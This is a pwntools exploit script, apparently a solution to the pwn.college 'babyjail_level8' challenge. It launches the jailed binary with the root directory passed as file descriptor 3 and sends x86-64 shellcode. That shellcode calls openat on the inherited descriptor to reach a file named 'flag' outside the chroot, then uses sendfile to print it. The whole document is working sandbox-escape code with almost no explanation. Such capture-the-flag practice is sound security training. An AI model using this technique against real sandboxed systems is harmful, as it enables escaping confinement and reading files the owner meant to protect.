from pwn import *
import os
e=context.binary=ELF("./babyjail_level8")
if args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key")
    s.checksec(0)
    p=s.process(["/bin/sh","-c","/challenge/babyjail_level8 3</"])
if args.LOCAL:
    p=process(["/bin/sh","-c","./babyjail_level8 3</"])
if args.GDB:
    gdb.attach(p,gdbscript="""
    set follow-child-mode child
    b *main+1117
    """)
context.log_level='debug'
pause()
p.recvuntil(b"Reading 0x1000 bytes of shellcode from stdin")
shellcode=asm("""
xor rax, rax
mov eax, 0x67616c66
push rax
push rsp

xor rdx, rdx 
mov rsi, [RSP + 0] 
mov rdi, 0x3
mov rax, 0x101
syscall 
add RSP, 16

mov r10, 0xc8
xor rdx, rdx 
mov rsi, 0x4
mov rdi, 0x1
mov rax, 0x28
syscall
""")
p.sendline(shellcode)
p.interactive()